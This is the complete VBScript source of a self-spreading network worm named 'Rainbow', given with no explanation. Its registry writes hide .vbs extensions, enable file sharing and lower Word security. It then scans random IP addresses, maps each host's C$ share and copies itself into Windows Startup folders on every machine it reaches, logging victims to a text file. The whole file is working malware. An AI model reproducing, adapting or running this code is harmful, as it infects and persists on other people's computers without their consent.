dim numa,numb,numc,numd,rand,dot,driveconnecte,ipname,count,ipfile
count = "0"
dot = "."
driveconnecte="0"
set wshnetwork = wscript.createobject("wscript.network")
Set fso = CreateObject("Scripting.FileSystemObject")
Set fso1 = createobject("scripting.filesystemobject")
set fso2 = createobject("scripting.filesystemobject")
Set r = fso.GetFile(WScript.ScriptFullName)
r.Copy("c:\rainbow.vbs")
on error resume next

regcreate "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\"&Level,1,"REG_DWORD"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Installed","1"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\Rainbow\Path","C:\\"
regcreate "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\VNETSUP\ComputerName"="Rainbow"
regcreate "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\VNETSUP\FileSharing","Yes"
regcreate "HKEY_CLASSES_ROOT\VBSFile\NeverShowExt","1"

randomize
checkfile()
randaddress()

do
 do while driveconnecte = "0"
 checkaddress()
 shareformat()
 wshnetwork.mapnetworkdrive "r:", ipname
 enumdrives()
 loop
copyfiles()
disconnectdrive()
loop

function disconnectdrive()
wshnetwork.removenetworkdrive "r:"
driveconnecte = "0"
end function

function createTxTfile()
Set ipfile = fso1.createtextfile("c:\rainbow.txt", True)
end function

function checkfile()
If (fso1.fileexists("c:\rainbow.txt")) then
fso1.deletefile("c:\network.vbs")
createTxTfile()
else
createTxTfile()
end If
ipfile.writeLine("Txt File Open")
end function

function copyfiles()
ipfile.writeline("Rainbow Copy to  :  " & ipname)
Set fso = CreateObject("scripting.filesystemobject")

fso.copyfile "c:\rainbow.vbs", "r:\"

If (fso2.FileExists("r:\rainbow.vbs")) Then
ipfile.writeline("Rainbow-VBS  at  :  " & ipname)
End If  

fso.copyfile "c:\rainbow.vbs", "r:\win95\startm~1\programs\startup\"
fso.copyfile "c:\rainbow.vbs", "r:\win98\startm~1\programs\startup\"
fso.copyfile "c:\rainbow.vbs", "r:\winme\startm~1\programs\startup\"
fso.copyfile "c:\rainbow.vbs", "r:\winnt\Profiles\All Users\startm~1\programs\startup\"
fso.copyfile "c:\rainbow.vbs", "r:\windows\startm~1\programs\startup\"
fso.copyfile "c:\rainbow.vbs", "r:\windows\startm~1\programs\啟動\"

fso.copyfile "c:\rainbow.vbs", "r:\win95\start menu\programs\startup\"
fso.copyfile "c:\rainbow.vbs", "r:\win98\start menu\programs\startup\"
fso.copyfile "c:\rainbow.vbs", "r:\winme\start menu\programs\startup\"
fso.copyfile "c:\rainbow.vbs", "r:\winnt\Profiles\All User\start menu\programs\startup\"
fso.copyfile "c:\rainbow.vbs", "C:\WINNT\Profiles\All Users\「開始」功能表\程式集\啟動\"
fso.copyfile "c:\rainbow.vbs", "r:\windows\start menu\programs\startup\"
fso.copyfile "c:\rainbow.vbs", "r:\windows\start menu\programs\啟動\"

end function

function checkaddress()
numd = numd + 1
if numd = "255" then randaddress()
end function

function shareformat()
ipname = "\\" & numa & dot & numb & dot & numc & dot & numd & "\C"
end function

function enumdrives()
Set odrives = wshnetwork.enumnetworkdrives
For i = 0 to odrives.Count -1
if ipname = odrives.item(i) then
driveconnecte = 1
else
' driveconnecte = 0
end if
Next
end function

function randum()
rand = int((254 * rnd) + 1)
end function

function randaddress()
if count < 100 then
numa=Int((16) * Rnd + 199)
count=count + 1
else
randum()
numa=rand
end if
randum()
numb=rand
randum()
numc=rand
numd="1"
ipfile.writeLine("IpName  :  " & numa & dot & numb & dot & numc & dot & "0")
end function
